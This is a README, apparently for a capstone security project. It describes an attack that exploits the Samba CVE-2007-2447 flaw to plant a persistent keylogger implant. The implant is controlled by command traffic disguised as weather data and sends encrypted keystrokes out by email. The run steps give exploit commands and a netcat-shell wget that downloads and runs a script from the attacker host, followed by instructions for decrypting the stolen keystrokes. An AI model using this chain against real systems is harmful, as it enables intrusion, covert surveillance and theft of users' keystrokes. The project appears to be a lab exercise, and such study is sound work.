# Capstone

## Description
A Cyber Effect that exploits [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) which is a vulnerability in the Samba server that allows remote code execution. The implant is injected into the [victim](#victim) machine using a weaponized [exploit](exploit/exploit.sh) and gathers key log data. Command and control communication is disguised as weather data that is requested by the implant over HTTP and the key log data is encrypted and sent by the implant over SMTPS.

## Exploit Scripts
- [exploit](exploit/exploit.sh)
- [run keylogger](exploit/run.sh)
- [add keylogger to boot file](exploit/rewriteBoot.sh)
## Python Scripts
- [implant](python/weather.py)
- [server](python/server.py)
- [txt file with email contents](python/keylog.txt)
- [decrypt email](python/decrypt_email.py)
## Binary
- [implant compiled to binary](exploit/weather)

## Requirements
### Email
An email address, preferably temporary, is needed so that the keylogger can send the key log data out of the [victim](#victim) machine.
### Virtual Machines

### Attacker

- Linux-based machine with Python on it (Kali-Linux is recommended)
- Machine with python on it to run the server script

### Victim

- [Ubuntu 8.04 Desktop with samba installed](https://drive.google.com/file/d/1bCviB84Nn4B2H-JRrIk0tRF7tXcdrCtE/view?usp=sharing)

## How To Run

1. Turn on all three devices (both [attackers](#attacker) and [victim](#victim)). You don’t need to log into [victim](#victim), but you do need to log into both [Kali-Linux and Server](#attacker).
2. In the [Server](#attacker), start the [server script](python/server.py) and record the public IP address it is running on. It is in this window where commands that control the implant are issued.

    ```bash
    python3 server.py
    ```

3. In the [Kali-Linux](#attacker), copy all the bash script files and binary file into the same folder

    ```bash
    > ls # should see only 4 files
    exploit.sh rewriteBoot.sh run.sh weather
    ```

4. Start attack by:

    ```bash
    chmod +x exploit.sh # give executable permission
    ./exploit.sh <Target IP> <Kali-Linux IP> # run exploit script
    ```

   Give it seconds, if nothing shows up after typing the command, give it another try.

5. Inside the netcat shell:

    ```bash
    wget http://<Kali-Linux IP>:8564/run.sh
    chmod +x run.sh
    ./run.sh <Kali-Linux IP> <Email Address> <Server IP>
    ```

   Terminate the process after a few second. You need to type CRTL+C twice. One for the NetCat one for the http server.

## Usage
The implant is now running in the [victim](#victim) and we can control it's behavior using the [Server](#attacker). By default the [Server](#attacker) sends weather data with a temperature of 50&deg;F which instructs the keylogger to collect data. This attribute can be changed by entering a number in the window the [server script](python/server.py) is running in and pressing Enter.

- `input` <= 0&deg;F encrypts the key log data and sends it in an email to the provided email address
- 0&deg;F < `input` <= 32&deg;F pauses the keylogger
- 32&deg;F < `input` <= 70&deg;F resumes the keylogger
- `input` > 70&deg;F stops the keylogger and removes the [implant](exploit/weather) and all files related to it on the [victim](#victim) machine

The message that is sent to the email address is encrypted using AES. To decrypt it and view the key log data, copy the contents into the [keylog.txt](python/keylog.txt) file and then run the [decrypt_email.py](python/decrypt_email.py) script, ensuring that they are in the same directory.

```bash
python3 decrypt_email.py
```

The decrypted key log data will now be in [keylog.txt](python/keylog.txt).